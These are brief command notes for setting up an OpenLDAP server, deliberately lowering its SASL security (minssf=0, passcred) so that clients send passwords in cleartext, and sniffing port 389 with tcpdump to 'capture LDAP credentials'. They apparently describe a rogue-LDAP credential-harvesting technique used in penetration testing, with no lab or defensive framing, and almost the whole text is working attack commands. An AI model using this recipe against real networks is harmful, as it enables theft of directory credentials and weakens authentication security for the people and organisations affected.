
To install sldap
```Script
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

To reconfigure sldap
```Script
sudo dpkg-reconfigure -p low slapd
```

To downgrade the security, creat olcSaslSecProps.ldif file.
```Script
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

```Script
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```
To verify
```Script
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

To capture LDAP credentials
```Script
sudo tcpdump -SX -i eth0 tcp port 389
```

